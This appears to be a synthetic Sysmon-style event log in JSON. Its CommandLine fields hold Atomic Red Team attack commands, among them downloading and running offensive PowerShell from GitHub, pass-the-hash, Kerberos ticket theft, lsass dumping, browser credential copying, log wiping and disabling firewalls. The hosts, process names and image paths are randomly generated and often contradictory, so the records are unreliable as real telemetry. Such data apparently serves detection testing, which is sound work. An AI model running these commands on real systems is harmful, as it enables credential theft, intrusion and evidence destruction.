    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-92.wilson-myers.com",
        "User": "karen74",
        "ProcessID": 5357,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"net user #{user_account} #{new_user_password} /add\\nnet.exe user #{user_account} #{new_password}\\n\",",
        "LogonID": 811909,
        "LogonGuid": "2e25bfa9-965f-405a-937f-c2ff4f472134",
        "SourceProcessID": 9555,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\go..exe",
        "DestinationProcessID": 3984,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\group..dll",
        "UtcTime": "2024-05-17T01:36:51.791978Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-08.randall-phillips.net",
        "User": "gina11",
        "ProcessID": 3355,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \\\\; #using \\\"rm\\\" execution\\nsudo find /var/log/ -name \\\"#{system_log_name2}.*\\\" -exec shred -u -z -n 3 {} \\\\; #using \\\"shred\\\" execution\\nsudo find /var/log/ -name \\\"#{system_log_name3}.*\\\" -exec unlink {} \\\\; #using \\\"unlink\\\" execution\\n\",",
        "LogonID": 740664,
        "LogonGuid": "67c8e54c-6719-4c9b-8cea-3636c1ac42b3",
        "SourceProcessID": 8856,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\check..exe",
        "DestinationProcessID": 6836,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\gas..exe",
        "UtcTime": "2024-05-17T01:36:51.792977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-94.dyer.com",
        "User": "ballpeggy",
        "ProcessID": 1818,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"finger base64_filedata@#{remote_host}\\n\",",
        "LogonID": 988072,
        "LogonGuid": "70beb4ac-049a-480d-8a44-d2bd287327f6",
        "SourceProcessID": 6274,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\whose..exe",
        "DestinationProcessID": 6517,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\start..exe",
        "UtcTime": "2024-05-17T01:36:51.792977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-37.mcdowell-bowers.info",
        "User": "kjones",
        "ProcessID": 6661,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\\nInvoke-SharpUp -command \\\"audit\\\"\",",
        "LogonID": 935193,
        "LogonGuid": "a55617c6-2db5-47e4-ac9b-41472a658a99",
        "SourceProcessID": 6744,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\add..exe",
        "DestinationProcessID": 2700,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\use..exe",
        "UtcTime": "2024-05-17T01:36:51.792977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-99.lamb.net",
        "User": "sandy90",
        "ProcessID": 4485,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"#{compiled_file} #{source_file}\\n\",",
        "LogonID": 668969,
        "LogonGuid": "dd290ed7-5437-42d7-9807-fe483bea6f7a",
        "SourceProcessID": 8233,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\course..dll",
        "DestinationProcessID": 8650,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\two..exe",
        "UtcTime": "2024-05-17T01:36:51.792977Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-51.miller-palmer.com",
        "User": "johnathanmaxwell",
        "ProcessID": 6008,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\\n\",",
        "LogonID": 527389,
        "LogonGuid": "fc5b4a49-c3ab-44ed-b131-e22bc989a183",
        "SourceProcessID": 1605,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\past..exe",
        "DestinationProcessID": 2286,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\might..dll",
        "UtcTime": "2024-05-17T01:36:51.792977Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-98.bryant-kemp.net",
        "User": "james75",
        "ProcessID": 1180,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$termsrvDll = \\\"C:\\\\Windows\\\\System32\\\\termsrv.dll\\\"\\n\\n$ACL = Get-Acl $termsrvDll\\n$permission = \\\"Administrators\\\",\\\"FullControl\\\",\\\"Allow\\\"\\n$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission\\n$ACL.SetAccessRule($accessRule)\\nSet-Acl -Path $termsrvDll -AclObject $ACL\\n\\nCopy-Item -Path \\\"C:\\\\Windows\\\\System32\\\\termsrv.dll\\\" -Destination \\\"C:\\\\Windows\\\\System32\\\\termsrv_backup.dll\\\" -ErrorAction Ignore\\nAdd-Content -Path \\\"C:\\\\Windows\\\\System32\\\\termsrv.dll\\\" -Value \\\"`n\\\" -NoNewline -ErrorAction Ignore\\nMove-Item -Path \\\"C:\\\\Windows\\\\System32\\\\termsrv_backup.dll\\\" -Destination \\\"C:\\\\Windows\\\\System32\\\\termsrv.dll\\\" -Force -ErrorAction Ignore\\n\",",
        "LogonID": 124896,
        "LogonGuid": "3ea620a4-e0ad-40b9-b401-6ccca7cfbff6",
        "SourceProcessID": 7752,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\beyond..dll",
        "DestinationProcessID": 4793,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\style..exe",
        "UtcTime": "2024-05-17T01:36:51.793977Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-37.mendez-grimes.com",
        "User": "michael80",
        "ProcessID": 2990,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg query \\\"HKEY_CURRENT_USER\\\\Control Panel\\\\International\\\\Geo\\\"\\n\",",
        "LogonID": 457644,
        "LogonGuid": "1ba62019-bfee-4986-85b8-1edae81f9a02",
        "SourceProcessID": 9098,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\organization..exe",
        "DestinationProcessID": 9862,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\collection..dll",
        "UtcTime": "2024-05-17T01:36:51.793977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-18.morales.info",
        "User": "cynthiamendez",
        "ProcessID": 2324,
        "ProcessName": "nc.exe",
        "CommandLine": "\"& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PsExec.exe\\\" -accepteula \\\\\\\\#{target} -w c:\\\\ -c \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\rubeus.exe\\\" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\\nSet-Location \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\nMove-Item -Force \\\"\\\\\\\\#{target}\\\\c$\\\\ticket.kirbi\\\" ticket.kirbi\\nWrite-Host \\\"Successfully retrieved TGT from '#{target}', now requesting a TGS from local\\\"\\n& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\rubeus.exe\\\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt\\nRemove-Item \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\ticket.kirbi\\\"\\n& \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\rubeus.exe\\\" purge      \",",
        "LogonID": 915097,
        "LogonGuid": "c4a5d2b4-2fa6-4d43-ab5a-a4c2595b778b",
        "SourceProcessID": 4243,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\image..exe",
        "DestinationProcessID": 1130,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\computer..exe",
        "UtcTime": "2024-05-17T01:36:51.793977Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-48.thomas.net",
        "User": "leewhite",
        "ProcessID": 3582,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}\",",
        "LogonID": 584174,
        "LogonGuid": "7befd35b-1269-46db-9383-ce71b1799bc1",
        "SourceProcessID": 3622,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\clear..dll",
        "DestinationProcessID": 2686,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\apply..dll",
        "UtcTime": "2024-05-17T01:36:51.793977Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-11.brown.org",
        "User": "ronald14",
        "ProcessID": 3066,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PsExec.exe\\\" \\\\\\\\#{remote_host} -u #{user_name} -p #{password} -accepteula \\\"C:\\\\Windows\\\\System32\\\\calc.exe\\\"\\n\",",
        "LogonID": 704323,
        "LogonGuid": "13f23c24-d97f-4cc4-b4a7-7520988fa3c2",
        "SourceProcessID": 2761,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\information..dll",
        "DestinationProcessID": 8170,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\model..exe",
        "UtcTime": "2024-05-17T01:36:51.793977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-23.robinson-stevens.com",
        "User": "tylerfarrell",
        "ProcessID": 7124,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b \\\"CN=Users,DC=#{domain},DC=#{top_level_domain}\\\" \\\"(objectClass=group)\\\" -s sub -a always -z 1000 dn \\n\",",
        "LogonID": 900762,
        "LogonGuid": "211c0b1c-4963-4167-b18e-4a73ce4e22d2",
        "SourceProcessID": 2594,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\various..exe",
        "DestinationProcessID": 1599,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\contain..exe",
        "UtcTime": "2024-05-17T01:36:51.794976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-97.roman.com",
        "User": "kevinpacheco",
        "ProcessID": 2371,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"if (-not (Test-Path \\\"#{file_to_manipulate}\\\")) { New-Item \\\"#{file_to_manipulate}\\\" -Force } \\necho \\\"1234567890\\\" > \\\"#{file_to_manipulate}\\\"\\nfsutil  file setZeroData offset=0 length=#{file_data_length} \\\"#{file_to_manipulate}\\\"\\n\",",
        "LogonID": 741062,
        "LogonGuid": "82c091fb-7ed9-4e39-99e7-57f68d30a5f9",
        "SourceProcessID": 7677,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\mind..dll",
        "DestinationProcessID": 8206,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\speech..exe",
        "UtcTime": "2024-05-17T01:36:51.794976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-65.murphy-mccoy.com",
        "User": "wfoster",
        "ProcessID": 1346,
        "ProcessName": "nc.exe",
        "CommandLine": "\"az login\\n$userprincipalname = \\\"#{userprincipalname}\\\"\\naz ad user delete --id $userprincipalname\",",
        "LogonID": 248379,
        "LogonGuid": "fac63968-ea8c-4ebe-993d-624f75b146ca",
        "SourceProcessID": 5094,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\agency..dll",
        "DestinationProcessID": 1633,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\animal..exe",
        "UtcTime": "2024-05-17T01:36:51.794976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-20.moreno-lamb.org",
        "User": "brianamadden",
        "ProcessID": 8316,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"New-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\DomainProfile\\\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\\nNew-ItemProperty \\\"HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\WindowsFirewall\\\\StandardProfile\\\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\\n\",",
        "LogonID": 743705,
        "LogonGuid": "4d6b206a-0667-4b4e-8f1f-b8e580409e52",
        "SourceProcessID": 6362,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\cause..exe",
        "DestinationProcessID": 5071,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\site..dll",
        "UtcTime": "2024-05-17T01:36:51.794976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-74.yoder-roach.info",
        "User": "johnmurphy",
        "ProcessID": 1112,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"setenforce 0\\n\",",
        "LogonID": 838227,
        "LogonGuid": "9214e62d-c63c-48bc-bba9-6e371709d42c",
        "SourceProcessID": 5853,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\whole..dll",
        "DestinationProcessID": 2467,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\phone..exe",
        "UtcTime": "2024-05-17T01:36:51.794976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-38.ayers.com",
        "User": "ianwilson",
        "ProcessID": 3872,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\\n\",",
        "LogonID": 257793,
        "LogonGuid": "b0739f6e-9af9-49d2-bec4-b9207a650821",
        "SourceProcessID": 6569,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\politics..exe",
        "DestinationProcessID": 8781,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\possible..exe",
        "UtcTime": "2024-05-17T01:36:51.795976Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-15.gill.com",
        "User": "robertsjeremy",
        "ProcessID": 4891,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"type C:\\\\Windows\\\\Panther\\\\unattend.xml\\ntype C:\\\\Windows\\\\Panther\\\\Unattend\\\\unattend.xml\\n\",",
        "LogonID": 654225,
        "LogonGuid": "ef4be649-ed57-49ab-8260-dc9fa1f9c1b1",
        "SourceProcessID": 5269,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\police..exe",
        "DestinationProcessID": 8607,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\we..dll",
        "UtcTime": "2024-05-17T01:36:51.795976Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-97.murphy-wilson.com",
        "User": "patriciagarza",
        "ProcessID": 1696,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"New-ItemProperty -Path \\\"HKLM:\\\\Software\\\\Microsoft\\\\Command Processor\\\" -Name \\\"AutoRun\\\" -Value \\\"#{command}\\\" -PropertyType \\\"String\\\"\",",
        "LogonID": 828161,
        "LogonGuid": "fea92aa6-6c53-4f06-ac32-e55a00e8a442",
        "SourceProcessID": 2860,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\him..exe",
        "DestinationProcessID": 3046,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\interview..dll",
        "UtcTime": "2024-05-17T01:36:51.795976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-15.collins.com",
        "User": "zandrews",
        "ProcessID": 5298,
        "ProcessName": "malware.exe",
        "CommandLine": "\"vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%\",",
        "LogonID": 829532,
        "LogonGuid": "4f46cf22-d5b8-4cf7-9da7-b62804ffe441",
        "SourceProcessID": 2023,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\technology..exe",
        "DestinationProcessID": 2322,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\condition..exe",
        "UtcTime": "2024-05-17T01:36:51.795976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-85.martinez.com",
        "User": "kathryn04",
        "ProcessID": 8602,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\nanodump.x64.exe --silent-process-exit \\\"#{output_folder}\\\"\\n\",",
        "LogonID": 658934,
        "LogonGuid": "9be214b7-10a9-46b8-933d-c0a54a79c3d4",
        "SourceProcessID": 2334,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\inside..exe",
        "DestinationProcessID": 1364,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\phone..dll",
        "UtcTime": "2024-05-17T01:36:51.795976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-02.romero.net",
        "User": "ogross",
        "ProcessID": 6514,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sudo truncate -s 0 #{system_log_path} #size parameter shorthand\\nsudo truncate --size=0 #{system_log_path} #size parameter \\n\",",
        "LogonID": 704118,
        "LogonGuid": "009050b6-02d4-4483-8154-f6bf4e47fc7a",
        "SourceProcessID": 9412,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\too..exe",
        "DestinationProcessID": 1335,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\leader..exe",
        "UtcTime": "2024-05-17T01:36:51.795976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-21.williams.com",
        "User": "huffmankenneth",
        "ProcessID": 2912,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA\\n\",",
        "LogonID": 642726,
        "LogonGuid": "6a8cebc4-f732-43a3-abcf-37c0bdb3150e",
        "SourceProcessID": 7119,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\life..exe",
        "DestinationProcessID": 8341,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\practice..dll",
        "UtcTime": "2024-05-17T01:36:51.796977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-91.vasquez.biz",
        "User": "cwhite",
        "ProcessID": 7774,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"cat > /etc/init.d/T1543.002 << EOF\\n#!/bin/bash\\n### BEGIN INIT INFO\\n# Provides : Atomic Test T1543.002\\n# Required-Start: $all\\n# Required-Stop : \\n# Default-Start: 2 3 4 5\\n# Default-Stop: \\n# Short Description: Atomic Test for Systemd Service Creation\\n### END INIT INFO\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBDcmVhdGluZyBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLmNyZWF0aW9uJykK'))\\\"\\nEOF\\n\\nchmod +x /etc/init.d/T1543.002\\nif [ $(cat /etc/os-release | grep -i ID=ubuntu) ] || [ $(cat /etc/os-release | grep -i ID=kali) ]; then update-rc.d T1543.002 defaults; elif [ $(cat /etc/os-release | grep -i 'ID=\\\"centos\\\"') ]; then chkconfig T1543.002 on ; else echo \\\"Please run this test on Ubnutu , kali OR centos\\\" ; fi ;\\nsystemctl enable T1543.002\\nsystemctl start T1543.002\\n\\necho \\\"python3 -c \\\\\\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgYSBTeXN0ZW1kIFNlcnZpY2UgVDE1NDMuMDAyID4gL3RtcC9UMTU0My4wMDIuc3lzdGVtZC5zZXJ2aWNlLm1vZGlmaWNhdGlvbicpCg=='))\\\\\\\"\\\" | sudo tee -a /etc/init.d/T1543.002\\nsystemctl daemon-reload\\nsystemctl restart T1543.002\\n\",",
        "LogonID": 937364,
        "LogonGuid": "3667926f-fe16-46c0-acbf-3b00ad014643",
        "SourceProcessID": 8494,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\shake..dll",
        "DestinationProcessID": 3212,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\share..exe",
        "UtcTime": "2024-05-17T01:36:51.796977Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-22.kemp.org",
        "User": "frederickmontoya",
        "ProcessID": 5308,
        "ProcessName": "nc.exe",
        "CommandLine": "\"esentutl.exe /y \\\"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\" /d \\\"#{output_path}\\\"\\n\",",
        "LogonID": 207097,
        "LogonGuid": "07a6960c-541e-4d13-895e-bc8c87419a32",
        "SourceProcessID": 1270,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\spend..dll",
        "DestinationProcessID": 5955,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\space..exe",
        "UtcTime": "2024-05-17T01:36:51.796977Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-59.diaz-mitchell.biz",
        "User": "ljones",
        "ProcessID": 1369,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"C:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe list apppool /config\",",
        "LogonID": 468062,
        "LogonGuid": "1fd5b869-7d1b-4236-af92-3e99089f86cf",
        "SourceProcessID": 3945,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\understand..dll",
        "DestinationProcessID": 6354,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\rise..dll",
        "UtcTime": "2024-05-17T01:36:51.796977Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-61.strong.com",
        "User": "bryanjohn",
        "ProcessID": 5342,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$exePath =  resolve-path \\\"$env:ProgramFiles\\\\dotnet\\\\shared\\\\Microsoft.NETCore.App\\\\5*\\\\createdump.exe\\\"\\n& \\\"$exePath\\\" -u -f $env:Temp\\\\dotnet-lsass.dmp (Get-Process lsass).id\\n\",",
        "LogonID": 879851,
        "LogonGuid": "74816f1e-e3c5-4cf7-b7b7-dddcc4430e50",
        "SourceProcessID": 6232,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\very..exe",
        "DestinationProcessID": 8951,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\successful..exe",
        "UtcTime": "2024-05-17T01:36:51.797976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-87.miller-palmer.net",
        "User": "thomasconley",
        "ProcessID": 3598,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"echo '' > /var/log/messages\\n\",",
        "LogonID": 879075,
        "LogonGuid": "e6918b72-5dcb-490a-940c-3a2bd958d384",
        "SourceProcessID": 5724,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\you..exe",
        "DestinationProcessID": 9052,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\late..dll",
        "UtcTime": "2024-05-17T01:36:51.797976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-74.price.com",
        "User": "boyerdanny",
        "ProcessID": 7408,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Set-Location -path \\\"#{file_path}\\\\Sysinternals\\\";\\n./accesschk.exe -accepteula .;\\n\",",
        "LogonID": 190150,
        "LogonGuid": "171421b4-fd8a-473d-8ce0-d38021bf633a",
        "SourceProcessID": 3473,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\record..exe",
        "DestinationProcessID": 2754,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\production..dll",
        "UtcTime": "2024-05-17T01:36:51.797976Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-51.navarro.com",
        "User": "ericrose",
        "ProcessID": 4180,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"query user /SERVER:#{computer_name}\\n\",",
        "LogonID": 388427,
        "LogonGuid": "7fee1a02-e306-4c11-8128-765007af5bea",
        "SourceProcessID": 6056,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\something..dll",
        "DestinationProcessID": 5098,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\anything..dll",
        "UtcTime": "2024-05-17T01:36:51.797976Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-61.chavez.biz",
        "User": "lawrencewilliams",
        "ProcessID": 4612,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$excelApp = New-Object -COMObject \\\"Excel.Application\\\"\\nif(-not $excelApp.path.contains(\\\"Program Files (x86)\\\")){\\n    Write-Host \\\"64-bit Office\\\"\\n    $excelApp.RegisterXLL(\\\"PathToAtomicsFolder\\\\T1137.006\\\\bin\\\\Addins\\\\excelxll_x64.xll\\\")\\n}\\nelse{\\n  Write-Host \\\"32-bit Office\\\"\\n  $excelApp.RegisterXLL(\\\"PathToAtomicsFolder\\\\T1137.006\\\\bin\\\\Addins\\\\excelxll_x86.xll\\\")\\n}\\n\",",
        "LogonID": 365664,
        "LogonGuid": "2f7046bf-bb14-44b0-8024-0c575d4f4867",
        "SourceProcessID": 5980,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\wife..dll",
        "DestinationProcessID": 7845,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\debate..dll",
        "UtcTime": "2024-05-17T01:36:51.797976Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-40.turner.biz",
        "User": "michael26",
        "ProcessID": 1185,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg.exe export HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\ \\\"PathToAtomicsFolder\\\\T1556.002\\\\lsa_backup.reg\\\"\\n$passwordFilterName = (Copy-Item \\\"#{dll_path}\\\\#{dll_name}\\\" -Destination \\\"C:\\\\Windows\\\\System32\\\" -PassThru).basename\\n$lsaKey = Get-Item \\\"HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\\\\"\\n$notificationPackagesValues = $lsaKey.GetValue(\\\"Notification Packages\\\")\\n$notificationPackagesValues += $passwordFilterName\\nSet-ItemProperty \\\"HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\\\\" \\\"Notification Packages\\\" $notificationPackagesValues\\n\",",
        "LogonID": 221338,
        "LogonGuid": "4ddc4c59-7be1-4424-9452-d669e640ccf8",
        "SourceProcessID": 9463,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\claim..dll",
        "DestinationProcessID": 3879,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\history..exe",
        "UtcTime": "2024-05-17T01:36:51.797976Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-87.burns.com",
        "User": "heather25",
        "ProcessID": 3001,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Set-ItemProperty \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\\\\" \\\"Userinit\\\" \\\"Userinit.exe, #{binary_to_execute}\\\" -Force\\n\",",
        "LogonID": 579743,
        "LogonGuid": "cb628949-c496-4a11-a303-6d60af14bc24",
